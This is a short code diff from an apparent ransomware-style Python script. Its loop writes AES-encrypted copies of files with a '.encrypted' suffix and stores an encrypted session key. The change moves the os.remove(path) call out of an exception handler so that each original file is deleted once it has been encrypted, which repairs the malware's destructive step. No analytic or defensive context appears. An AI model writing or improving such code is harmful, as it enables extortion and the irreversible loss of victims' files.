@@ -76,12 +76,12 @@ def main():
                     newf = path+'.encrypted'
                     with open(newf, 'wb') as f:
                         [ f. write(x) for x in (enc_aes, c_aes.nonce, tag, ciphertext)]
+                os.remove(path)
+
             except IndexError as e:
                 print("index error, skipping")
             except Exception as e:
                 print(e)
-
-                os.remove(path)
 
     # After done encrypting all files, write temp file of encrypted session key
     cwd = Path.cwd()
